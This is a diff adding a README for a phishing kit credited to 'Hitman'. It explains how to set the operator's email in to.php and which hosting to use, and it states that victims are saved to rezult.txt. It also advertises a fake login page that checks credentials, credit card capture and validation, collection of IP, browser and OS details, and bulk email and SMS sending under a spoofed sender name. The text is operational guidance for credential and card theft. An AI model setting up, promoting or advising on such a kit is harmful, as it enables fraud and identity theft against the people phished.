@@ -1,0 +1,39 @@
+1- Download pages (direct link youtube on YouTube.)
+
+2- open file (to.php) and change email (email@example.com)
+   Note:
+   Must be a site hosting supports SMTP service to send emails
+
+Free Hosting without SMTP:
+
+https://infinityfree.net/
+http://capnix.com/
+https://byet.host/
+http://www.uhostall.com/
+https://www.hostinger.co.uk/
+------------------------
+
+Hosting with SMTP:
+www.namecheap.com/
+www.whois.com/
+www.godaddy.com
+www.hostgator.com
+
+-----------------------------------------------------------
+All hosting sites (automatic save victims {rezult.txt})
+-----------------------------------------------------------
+***Send bulk emails
+***Send bulk SMS With Sender Name
+-----------------------------------------------------------
+*** Please contact me for help and inquire.
+*** Contact information on YouTube.
+-----------------------------------------------------------
++ Smart style and design
++ Auto login to real account
++ Start with login page
++ Validate Email and Password
++ Javascript form validation
++ Auto detect credit card type & Validate# 100%
++ Full info + ip address + browser + OS + Date&Time
+
+---------- Coded & Tools By Hitman---------
